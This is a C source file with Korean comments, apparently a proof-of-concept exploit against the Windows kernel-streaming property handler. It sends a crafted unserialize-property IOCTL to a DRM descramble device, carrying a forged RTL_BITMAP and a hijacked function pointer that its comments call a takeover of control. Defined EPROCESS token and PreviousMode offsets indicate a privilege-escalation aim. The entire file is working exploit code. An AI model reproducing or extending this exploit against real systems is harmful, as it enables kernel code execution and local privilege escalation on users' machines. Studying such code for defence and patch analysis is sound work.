#define UNICODE 1
#define _UNICODE 1

#include <windows.h>
#include <winioctl.h>
#include <initguid.h>
#include <ks.h>
#include <ksmedia.h>
#include <ksproxy.h>
#include <setupapi.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "ksproxy.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ksuser.lib")

#define EPROCESS_TOKEN_OFFSET           0x4B8
#define KTHREAD_PREVIOUS_MODE_OFFSET    0x232
#define TOKEN_SIZE                      0x8

typedef struct _RTL_BITMAP {
    DWORD SizeOfBitMap; 
    PVOID Buffer;
} RTL_BITMAP, * PRTL_BITMAP;

#pragma pack(1)
typedef struct _EXPLOIT_DATA1 {
    PRTL_BITMAP FakeBitmap; // 커널이 참조할 위조된 RTL_BITMAP
    ULONGLONG FunctionPtr; // 함수 포인터 필드(실제 사용은 안함) 
} EXPLOIT_DATA1;

#pragma pack(1)
typedef struct _EXPLOIT_DATA2 {
    char pad[0x20]; // 적절한 패딩으로 offset 맞춤
    PVOID ptr_ArbitraryFunCall; // 제어권 탈취를 위한 함수 포인
} EXPLOIT_DATA2;

extern "C" {
    __declspec(dllimport)
        HRESULT WINAPI KsOpenDefaultDevice(
            const GUID* Category,
            ACCESS_MASK Access,
            PHANDLE DeviceHandle
        );
}


HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = 0;
    HRESULT hr = KsOpenDefaultDevice(&categories, GENERIC_READ | GENERIC_WRITE, &hDevice);
    if (hr != NOERROR) return NULL;
    return hDevice;
}

UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;
EXPLOIT_DATA2* pInBufPropertyData = (EXPLOIT_DATA2*)(pInBufProperty + 1);

UCHAR UnserializePropertySetRequest[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };
KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)UnserializePropertySetRequest;
KSPROPERTY_SERIAL* pSerial = (KSPROPERTY_SERIAL*)(pSerialHdr + 1);
EXPLOIT_DATA1* pOutBufPropertyData = (EXPLOIT_DATA1*)(pSerial + 1);


BOOL SendIoctlReq(HANDLE hDevice) {
    return DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        pInBufProperty, sizeof(InBuffer),
        pSerialHdr, sizeof(UnserializePropertySetRequest),
        NULL, NULL
    );
}

void* AllocateBitmap(SIZE_T size, LPVOID baseAddress) {
    return VirtualAlloc(baseAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

__inline void* Ptr64(const unsigned long long ull) {
    return((void*)(ULONG_PTR)ull);
}

int wmain() {
    HANDLE hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return 1;

    pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0x0;

    pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
    pSerialHdr->Count = 0x1;

    pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
    pSerial->Id = 0x0;
    pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    pSerial->PropTypeSet.Flags = 0x0;
    pSerial->PropTypeSet.Id = 0x45;

    pOutBufPropertyData->FakeBitmap = (PRTL_BITMAP)AllocateBitmap(sizeof(RTL_BITMAP), Ptr64(0x10000000));
    if (!pOutBufPropertyData->FakeBitmap) {
        CloseHandle(hDevice);
        return 1;
    } // 커널 구조체 닫기
    
    pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x80;
    pOutBufPropertyData->FakeBitmap->Buffer = Ptr64(0xDEADBEEFDEADBEEF);

    pInBufPropertyData->ptr_ArbitraryFunCall = Ptr64(0x4242424242424242); // 주요 제어권 탈취
    
    // KsPorpertyHandler() -> KsPropertyHandler() -> KspUnserializePropertyset() 경로로 전달
    // 취약한 역직렬화 코드로 실행됨

    BOOL res = SendIoctlReq(hDevice);

    if (!res) {
        DWORD err = GetLastError();
        printf("[-] SendIoctlReq failed. Error = %lu\n", err);
        if (err == 87) printf("[!] ERROR_INVALID_PARAMETER\n");
        else if (err == 1784) printf("[!] ERROR_INVALID_USER_BUFFER\n");
    }

    if (pOutBufPropertyData->FakeBitmap) VirtualFree(pOutBufPropertyData->FakeBitmap, 0, MEM_RELEASE);
    if (hDevice != INVALID_HANDLE_VALUE) CloseHandle(hDevice);

    return 0;

}
